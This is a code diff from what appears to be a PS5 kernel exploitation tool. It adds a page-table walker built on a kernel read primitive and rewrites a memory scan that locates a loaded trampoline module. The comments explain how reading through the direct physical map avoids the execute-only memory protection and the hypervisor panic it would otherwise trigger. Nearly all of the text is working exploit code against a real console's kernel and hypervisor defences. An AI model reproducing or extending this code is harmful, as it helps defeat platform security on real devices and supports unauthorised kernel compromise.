@@ -508,6 +508,27 @@ static uint64_t kva_to_pa(uint64_t va) {
     return va_to_cpu_pa(va);
 }
 
+/* Silent page table walk: returns PA or 0 if unmapped.  No printf. */
+static uint64_t va_to_pa_quiet(uint64_t va) {
+    if (!g_cr3_phys || !g_dmap_base) return 0;
+
+    uint64_t e;
+    kernel_copyout(g_dmap_base + g_cr3_phys + ((va >> 39) & 0x1FF) * 8, &e, 8);
+    if (!(e & PTE_PRESENT)) return 0;
+
+    kernel_copyout(g_dmap_base + (e & PTE_PA_MASK) + ((va >> 30) & 0x1FF) * 8, &e, 8);
+    if (!(e & PTE_PRESENT)) return 0;
+    if (e & PTE_PS) return (e & 0x000FFFFFC0000000ULL) | (va & 0x3FFFFFFF);
+
+    kernel_copyout(g_dmap_base + (e & PTE_PA_MASK) + ((va >> 21) & 0x1FF) * 8, &e, 8);
+    if (!(e & PTE_PRESENT)) return 0;
+    if (e & PTE_PS) return (e & 0x000FFFFFFFE00000ULL) | (va & 0x1FFFFF);
+
+    kernel_copyout(g_dmap_base + (e & PTE_PA_MASK) + ((va >> 12) & 0x1FF) * 8, &e, 8);
+    if (!(e & PTE_PRESENT)) return 0;
+    return (e & PTE_PA_MASK) | (va & 0xFFF);
+}
+
 /* ─── Direct MMIO SBL communication ─── */
 
 /*
@@ -1362,156 +1383,145 @@ static void campaign_kmod_kldload(void) {
                (unsigned long)g_kdata_base, (unsigned long)g_ktext_base,
                (unsigned long)g_dmap_base);
 
-        /* ── Scan strategy ──
-         * The kernel data base on PS5 (0xffffffffc3f70000) is near the top
-         * of the 64-bit address space.  kmem_malloc allocations come from
-         * kernel_arena which covers virtual_avail → 0xffffffffffffffff.
-         * We scan multiple ranges to cover all possibilities:
+        /* ── XOM-safe scan strategy ──
          *
-         * Range 1: After kernel static data → top of address space
-         *          (g_kdata_base + 128MB → 0xffffffffffff_f000)
-         * Range 2: Between DMAP end and kernel text
-         *          (g_dmap_base + 8GB → g_ktext_base)
-         *          In case Sony placed kernel_arena in a different region.
+         * CRITICAL: We cannot use kernel_copyout on arbitrary kernel VAs
+         * because PS5 kernel .text is execute-only (XOM) via NPT.  Reading
+         * XOM pages through the pipe-based kernel_copyout triggers a nested
+         * page fault → hypervisor panic → kernel panic.
          *
-         * We read only the first 64 bytes of each page (the trampoline is
-         * at offset 0 of the page-aligned allocation). */
+         * Safe approach: for each candidate VA, walk the kernel page tables
+         * (via DMAP, which is always readable) to get the physical address,
+         * then read the physical page through DMAP.  DMAP maps ALL physical
+         * memory as RW, so even XOM .text pages are readable via their DMAP
+         * mapping.
+         *
+         * Scan ranges (with overflow protection for high kernel addresses):
+         *   Range 1: g_kdata_base + 128MB → top of address space
+         *   Range 2: DMAP + 8GB → g_ktext_base
+         *   Range 3: start of kernel VA → DMAP base
+         */
 
         uint64_t trampoline_kva = 0;
-        uint64_t total_pages_scanned = 0, total_pages_readable = 0;
+        uint64_t total_pages_scanned = 0, total_pages_mapped = 0;
         uint8_t hdr[64];
 
-        /* Helper: scan a range for the trampoline at page boundaries */
-        #define SCAN_RANGE(start, end, label) do {                              \
-            uint64_t _s = (start), _e = (end);                                  \
-            if (_s < _e && trampoline_kva == 0) {                               \
-                printf("[*] %s: 0x%lx → 0x%lx (%luMB)\n", (label),             \
-                       (unsigned long)_s, (unsigned long)_e,                    \
-                       (unsigned long)((_e - _s) >> 20));                       \
-                for (uint64_t _a = _s; _a < _e && _a >= _s; _a += 0x1000) {    \
-                    total_pages_scanned++;                                      \
-                    if (total_pages_scanned % 16384 == 0)                       \
-                        printf("    ...%luMB, %lu readable\n",                  \
-                               (unsigned long)(total_pages_scanned >> 8),       \
-                               (unsigned long)total_pages_readable);            \
-                    if (kernel_copyout(_a, hdr, sizeof(hdr)) != 0)              \
-                        continue;                                               \
-                    total_pages_readable++;                                      \
-                    if (memcmp(hdr, tramp_prefix, sizeof(tramp_prefix)) != 0)   \
-                        continue;                                               \
-                    if (memcmp(hdr + suffix_off, tramp_suffix,                  \
-                               sizeof(tramp_suffix)) != 0) continue;           \
-                    trampoline_kva = _a;                                        \
-                    printf("[+] FOUND trampoline at 0x%lx!\n",                  \
-                           (unsigned long)_a);                                  \
-                    printf("    bytes: ");                                       \
-                    for (int _b = 0; _b < 35; _b++)                             \
-                        printf("%02x ", hdr[_b]);                               \
-                    printf("\n");                                                \
-                    break;                                                       \
-                }                                                                \
-            }                                                                    \
-        } while(0)
+        /* Define scan ranges (up to 4) */
+        struct { uint64_t start, end; const char *label; } ranges[4];
+        int nranges = 0;
 
         /* Range 1: above kernel data → top of address space */
         {
-            uint64_t r1_start = g_kdata_base + 0x8000000;  /* +128MB */
-            uint64_t r1_end   = 0xFFFFFFFFFFFFF000ULL;     /* near top */
-            /* But cap at ~1GB to avoid scanning too long */
-            if (r1_end - r1_start > 0x40000000ULL)
-                r1_end = r1_start + 0x40000000ULL;
-            /* Overflow protection: if r1_start > r1_end, skip */
-            if (r1_start < r1_end)
-                SCAN_RANGE(r1_start, r1_end, "Range 1 (above kernel data)");
+            uint64_t s = g_kdata_base + 0x8000000;
+            uint64_t e = 0xFFFFFFFFFFFFF000ULL;
+            if (e - s > 0x40000000ULL) e = s + 0x40000000ULL;
+            if (s < e) { ranges[nranges++] = (typeof(ranges[0])){s, e, "above kdata"}; }
         }
-
         /* Range 2: between DMAP end and kernel text */
-        if (trampoline_kva == 0) {
-            uint64_t r2_start = g_dmap_base + 0x200000000ULL; /* DMAP + 8GB */
-            uint64_t r2_end   = g_ktext_base;
-            /* Cap to reasonable size */
-            if (r2_end > r2_start && (r2_end - r2_start) > 0x40000000ULL)
-                r2_start = r2_end - 0x40000000ULL;
-            if (r2_start < r2_end)
-                SCAN_RANGE(r2_start, r2_end, "Range 2 (DMAP→ktext gap)");
+        {
+            uint64_t s = g_dmap_base + 0x200000000ULL;
+            uint64_t e = g_ktext_base;
+            if (e > s && e - s > 0x40000000ULL) s = e - 0x40000000ULL;
+            if (s < e) { ranges[nranges++] = (typeof(ranges[0])){s, e, "DMAP→ktext gap"}; }
+        }
+        /* Range 3: below DMAP base */
+        {
+            uint64_t s = 0xFFFF800000000000ULL;
+            uint64_t e = g_dmap_base;
+            if (e > s && e - s > 0x40000000ULL) s = e - 0x40000000ULL;
+            if (s < e) { ranges[nranges++] = (typeof(ranges[0])){s, e, "below DMAP"}; }
         }
 
-        /* Range 3: below DMAP (in case kernel arena is in another region) */
-        if (trampoline_kva == 0) {
-            uint64_t r3_start = 0xFFFF800000000000ULL;     /* start of kernel VA */
-            uint64_t r3_end   = g_dmap_base;
-            if (r3_end > r3_start && (r3_end - r3_start) > 0x40000000ULL)
-                r3_start = r3_end - 0x40000000ULL;
-            if (r3_start < r3_end)
-                SCAN_RANGE(r3_start, r3_end, "Range 3 (below DMAP)");
+        for (int ri = 0; ri < nranges && trampoline_kva == 0; ri++) {
+            uint64_t rs = ranges[ri].start, re = ranges[ri].end;
+            printf("[*] Scan %d/%d (%s): 0x%lx → 0x%lx (%luMB)\n",
+                   ri + 1, nranges, ranges[ri].label,
+                   (unsigned long)rs, (unsigned long)re,
+                   (unsigned long)((re - rs) >> 20));
+
+            for (uint64_t va = rs; va < re && va >= rs; va += 0x1000) {
+                total_pages_scanned++;
+                if (total_pages_scanned % 16384 == 0)
+                    printf("    ...%luMB, %lu mapped so far\n",
+                           (unsigned long)(total_pages_scanned >> 8),
+                           (unsigned long)total_pages_mapped);
+
+                /* Walk page tables to get PA (safe: reads via DMAP) */
+                uint64_t pa = va_to_pa_quiet(va);
+                if (pa == 0) continue;  /* not mapped */
+                total_pages_mapped++;
+
+                /* Read via DMAP — safe even for XOM pages */
+                if (kernel_copyout(g_dmap_base + (pa & ~0xFFFULL), hdr, sizeof(hdr)) != 0)
+                    continue;
+
+                if (memcmp(hdr, tramp_prefix, sizeof(tramp_prefix)) != 0)
+                    continue;
+                if (memcmp(hdr + suffix_off, tramp_suffix, sizeof(tramp_suffix)) != 0)
+                    continue;
+
+                trampoline_kva = va;
+                printf("[+] FOUND trampoline at VA 0x%lx (PA 0x%lx)!\n",
+                       (unsigned long)va, (unsigned long)pa);
+                printf("    bytes: ");
+                for (int b = 0; b < 35; b++) printf("%02x ", hdr[b]);
+                printf("\n");
+                break;
+            }
         }
 
-        #undef SCAN_RANGE
-
-        /* Fallback: full-page scan for sentinel value */
+        /* Fallback: scan for sentinel value (also via DMAP) */
         if (trampoline_kva == 0) {
-            printf("[*] Page-boundary scan failed — trying sentinel scan...\n");
-            printf("[*] Searching for sentinel 0x%lx ...\n",
-                   (unsigned long)result_kva);
+            printf("[*] Page-boundary scan failed — trying sentinel scan via DMAP...\n");
+            printf("[*] Searching for sentinel 0x%lx\n", (unsigned long)result_kva);
 
             uint8_t page[4096];
-            uint64_t sentinel_addr = 0;
-
-            /* Scan above kernel data (with overflow protection) */
-            uint64_t fs = g_kdata_base + 0x8000000;
-            uint64_t fe = fs + 0x40000000ULL;
-            if (fe <= fs) fe = 0xFFFFFFFFFFFFF000ULL;
-
-            for (uint64_t addr = fs; addr < fe && addr >= fs; addr += 0x1000) {
-                if (kernel_copyout(addr, page, sizeof(page)) != 0)
-                    continue;
-                for (int off = 0; off <= 4096 - 8; off += 8) {
-                    uint64_t v;
-                    memcpy(&v, page + off, 8);
-                    if (v == result_kva) {
-                        sentinel_addr = addr + off;
-                        printf("[+] Found sentinel at 0x%lx\n",
-                               (unsigned long)sentinel_addr);
-                        break;
+            uint64_t sentinel_va = 0;
+            for (int ri = 0; ri < nranges && sentinel_va == 0; ri++) {
+                for (uint64_t va = ranges[ri].start;
+                     va < ranges[ri].end && va >= ranges[ri].start;
+                     va += 0x1000) {
+                    uint64_t pa = va_to_pa_quiet(va);
+                    if (pa == 0) continue;
+                    if (kernel_copyout(g_dmap_base + (pa & ~0xFFFULL),
+                                       page, sizeof(page)) != 0)
+                        continue;
+                    for (int off = 0; off <= 4096 - 8; off += 8) {
+                        uint64_t v;
+                        memcpy(&v, page + off, 8);
+                        if (v == result_kva) {
+                            sentinel_va = va + off;
+                            printf("[+] Found sentinel at VA 0x%lx\n",
+                                   (unsigned long)sentinel_va);
+                            break;
+                        }
                     }
                 }
-                if (sentinel_addr) break;
             }
 
-            if (sentinel_addr) {
-                /* Found .data; search backward for .text trampoline */
-                uint64_t slo = (sentinel_addr & ~0xFFFULL) - 0x10000;
-                for (uint64_t addr = slo; addr < sentinel_addr; addr += 0x1000) {
-                    if (kernel_copyout(addr, hdr, sizeof(hdr)) != 0) continue;
+            if (sentinel_va) {
+                /* .text is before .data in the loaded module.
+                 * Search backward from sentinel for trampoline. */
+                uint64_t slo = (sentinel_va & ~0xFFFULL) - 0x10000;
+                for (uint64_t va = slo; va < sentinel_va; va += 0x1000) {
+                    uint64_t pa = va_to_pa_quiet(va);
+                    if (pa == 0) continue;
+                    if (kernel_copyout(g_dmap_base + (pa & ~0xFFFULL),
+                                       hdr, sizeof(hdr)) != 0)
+                        continue;
                     if (memcmp(hdr, tramp_prefix, sizeof(tramp_prefix)) == 0 &&
                         memcmp(hdr + suffix_off, tramp_suffix, sizeof(tramp_suffix)) == 0) {
-                        trampoline_kva = addr;
+                        trampoline_kva = va;
                         printf("[+] FOUND trampoline at 0x%lx (backward from sentinel)!\n",
-                               (unsigned long)addr);
+                               (unsigned long)va);
                         break;
-                    }
-                }
-                /* Try non-aligned scan */
-                if (trampoline_kva == 0) {
-                    for (uint64_t addr = slo; addr < sentinel_addr; addr += 0x1000) {
-                        if (kernel_copyout(addr, page, sizeof(page)) != 0) continue;
-                        for (int off = 0; off <= 4096 - 35; off++) {
-                            if (memcmp(page + off, tramp_prefix, sizeof(tramp_prefix)) == 0 &&
-                                memcmp(page + off + suffix_off, tramp_suffix, sizeof(tramp_suffix)) == 0) {
-                                trampoline_kva = addr + off;
-                                printf("[+] FOUND trampoline at 0x%lx (non-aligned)!\n",
-                                       (unsigned long)trampoline_kva);
-                                break;
-                            }
-                        }
-                        if (trampoline_kva) break;
                     }
                 }
             }
         }
 
-        printf("[*] Scan complete: %lu pages checked, %lu readable\n",
-               (unsigned long)total_pages_scanned, (unsigned long)total_pages_readable);
+        printf("[*] Scan complete: %lu pages checked, %lu mapped\n",
+               (unsigned long)total_pages_scanned, (unsigned long)total_pages_mapped);
 
         if (trampoline_kva == 0) {
             printf("[-] Trampoline not found in any scan range.\n");
